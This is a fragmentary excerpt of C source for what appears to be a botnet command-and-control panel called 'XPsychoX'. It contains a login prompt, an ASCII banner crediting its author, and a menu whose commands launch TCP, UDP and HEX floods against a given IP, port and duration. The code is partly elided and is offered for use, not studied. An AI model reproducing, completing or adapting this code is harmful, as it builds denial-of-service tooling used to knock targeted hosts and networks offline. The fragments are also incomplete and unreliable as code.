...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        sprintf(user, "\e[33mXpsychoX user ~  ");
        ...
        sprintf(password, "\e[34mXpsychoX password ~  ", accounts[find_line].username);
...
sprintf(ascii_banner_line10,  "\e[33m                           [*]Instagram- @\e[34mTournaments[*]                    \r\n");
sprintf(ascii_banner_line1,   "\e[33m        ██╗  ██╗██████╗ ███████╗██╗   ██╗\e[34m ██████╗██╗  ██╗ ██████╗ ██╗  ██╗  \r\n");                                                                                                  
sprintf(ascii_banner_line2,   "\e[33m        ╚██╗██╔╝██╔══██╗██╔════╝╚██╗ ██╔╝\e[34m██╔════╝██║  ██║██╔═══██╗╚██╗██╔╝  \r\n");                                                                                                 
sprintf(ascii_banner_line3,   "\e[33m         ╚███╔╝ ██████╔╝███████╗ ╚████╔╝ \e[34m██║     ███████║██║   ██║ ╚███╔╝   \r\n"); 
sprintf(ascii_banner_line4,   "\e[33m         ██╔██╗ ██╔═══╝ ╚════██║  ╚██╔╝  \e[34m██║     ██╔══██║██║   ██║ ██╔██╗   \r\n"); 
sprintf(ascii_banner_line5,   "\e[33m        ██╔╝ ██╗██║     ███████║   ██║   \e[34m╚██████╗██║  ██║╚██████╔╝██╔╝ ██╗  \r\n"); 
sprintf(ascii_banner_line6,   "\e[33m                        [*]Made by @xfernand\e[34mox_xgonzalezx[*]                \r\n"); 
sprintf(ascii_banner_line7,   "\e[33m                              [*]Please Don'\e[34mt spam![*]                      \r\n");
sprintf(ascii_banner_line8,   "\e[33m                                                                            \r\n"); 
  ...
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[33m%s\e[33m@\e[34mXPsychoX  ~  ", accounts[find_line].username);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
				...
				sprintf(ls1,  "\e[33m*** TCP ~ !* TCP IP PORT TIME 32 all 1460 10     \e[34m|\e[34m Launch A TCP Flood\r\n");
				sprintf(ls2,  "\e[33m*** UDP ~ !* UDP IP PORT TIME 32 1460 10      	 \e[34m|\e[34m Launch A UDP Flood\r\n");
				sprintf(ls3,  "\e[33m*** HEX ~ !* HEX IP PORT TIME PSIZE           	 \e[34m|\e[34m Launch A HEX Flood\r\n");
				sprintf(ls4,  "\e[33m*** STOP ~ !* STOP           	            	 \e[34m|\e[34m Stops ALL Attacks\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
				...
				while(1) {
		char input [5000];
        sprintf(input, "\e[33m%s\x1b\e[33m@\e[34mXPsychoX  ~  ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
